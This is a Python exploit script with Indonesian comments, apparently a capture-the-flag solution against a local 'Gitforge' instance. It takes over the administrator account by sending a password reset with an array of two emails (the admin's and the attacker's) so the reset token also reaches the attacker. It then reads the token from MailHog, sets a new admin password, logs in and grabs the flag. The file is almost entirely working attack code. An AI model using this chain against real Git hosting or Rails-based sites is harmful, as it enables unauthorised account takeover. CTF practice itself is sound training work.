#!/usr/bin/env python3
#!/usr/bin/env python3
import requests
import re
import time

BASE_URL = "http://localhost:1337"
MAILHOG_URL = "http://localhost:8025"
SESSION = requests.Session()

def main():
    print("="*50)
    print("  Pwn The Gitforge - Full Chain Exploit")
    print("="*50)

    # Step 1: Dapat email admin dari security.txt
    print("\n[*] Step 1: Recon security.txt...")
    r = requests.get(f"{BASE_URL}/.well-known/security.txt")
    match = re.search(r'mailto:(\S+)', r.text)
    admin_email = match.group(1)
    print(f"[+] Admin email: {admin_email}")

    # Step 2: Trigger reset - admin email pertama, attacker kedua
    # Pakai email yang valid biar MailHog mau terima
    attacker_email = "attacker@gitforge.local"
    print(f"\n[*] Step 2: Trigger password reset array...")
    print(f"    user[email][0] = {admin_email}  (target_user = admin)")
    print(f"    user[email][1] = {attacker_email}  (token juga dikirim ke sini)")

    data = {
        "authenticity_token": "a" * 32,
        "user[email][]": [admin_email, attacker_email]
    }
    r = SESSION.post(f"{BASE_URL}/users/password", data=data)
    print(f"[+] Status: {r.status_code} | URL: {r.url}")

    # Step 3: Ambil token dari MailHog
    print("\n[*] Step 3: Ambil token dari MailHog...")
    time.sleep(2)

    r = requests.get(f"{MAILHOG_URL}/api/v2/messages")
    data = r.json()
    print(f"[+] Total email: {data.get('total', 0)}")

    token = None
    for msg in data.get('items', []):
        body = msg['Content']['Body']
        print(f"    To: {msg['Raw']['To']} | Subject: {msg['Content']['Headers'].get('Subject', ['?'])[0]}")
        match = re.search(r'reset_password_token=([A-Za-z0-9_-]+)', body)
        if match:
            token = match.group(1)
            print(f"[+] Token: {token}")
            break

    if not token:
        print("[-] Token tidak ditemukan!")
        print("[*] Semua email body:")
        for msg in data.get('items', []):
            print(msg['Content']['Body'][:200])
        return

    # Step 4: Ambil CSRF dari form reset
    print(f"\n[*] Step 4: Akses form reset...")
    r = SESSION.get(f"{BASE_URL}/users/password/edit?reset_password_token={token}")
    csrf_match = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
    csrf = csrf_match.group(1) if csrf_match else "a" * 32
    print(f"[+] CSRF: {csrf[:20]}...")

    # Step 5: Reset password admin
    print(f"\n[*] Step 5: Reset password admin...")
    new_pass = "Hacked123!"
    data = {
        "authenticity_token": csrf,
        "user[reset_password_token]": token,
        "user[password]": new_pass,
        "user[password_confirmation]": new_pass,
        "_method": "put"
    }
    r = SESSION.post(f"{BASE_URL}/users/password", data=data)
    print(f"[+] Status: {r.status_code} | URL: {r.url}")

    # Step 6: Login sebagai admin
    print(f"\n[*] Step 6: Login sebagai admin...")
    data = {
        "user[login]": admin_email,
        "user[password]": new_pass
    }
    r = SESSION.post(f"{BASE_URL}/users/sign_in", data=data)
    print(f"[+] Status: {r.status_code} | URL: {r.url}")

    # Step 7: Ambil flag
    print(f"\n[*] Step 7: Ambil flag dari dashboard...")
    r = SESSION.get(f"{BASE_URL}/dashboard")
    match = re.search(r'pwn\{[^}]+\}', r.text)
    if match:
        print(f"\n{'='*50}")
        print(f"[+] FLAG: {match.group(0)}")
        print(f"{'='*50}")
    else:
        print("[-] Flag tidak ditemukan, debug:")
        print(r.text[:800])

if __name__ == "__main__":
    main()
